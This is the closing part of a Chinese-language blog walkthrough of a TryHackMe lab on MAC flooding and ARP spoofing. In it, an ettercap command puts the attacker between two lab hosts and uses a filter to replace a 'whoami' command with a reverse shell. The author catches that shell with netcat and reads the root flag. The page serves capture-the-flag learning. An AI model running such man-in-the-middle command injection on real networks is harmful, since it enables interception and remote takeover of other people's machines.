+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ettercap -T -i eth1 -M arp /192.168.12.10// /192.168.12.20// -F whoami.ef<br></code></pre></td></tr></table></figure>
+
+<p>看到提示信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">filter engine: Cannot open file /root/ettercap.log<br><span class="hljs-comment">###### ETTERFILTER: substituted &#x27;whoami&#x27; with reverse shell. ######</span><br></code></pre></td></tr></table></figure>
+
+<p>就表示替换成功收到了6666的shell，然后fg：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@eve:~<span class="hljs-comment"># fg</span><br>nc -nvlp 6666<br><span class="hljs-built_in">ls</span><br>rev.go<br>root.txt<br>server.sh<br>www<br><span class="hljs-built_in">cat</span> root.txt<br>THM&#123;wh4t_an_ev1l_M!tM_u_R&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C/">#漏洞实验</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>MAC Flooding and ARP Spoofing</div>
+      <div>http://example.com/2022/10/06/MAC-Flooding-ARP-Spoofing/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Waldo/" title="HackTheBox-Waldo">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Waldo</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/TryHackMe-Holo/" title="TryHackMe-Holo">
+                        <span class="hidden-mobile">TryHackMe-Holo</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
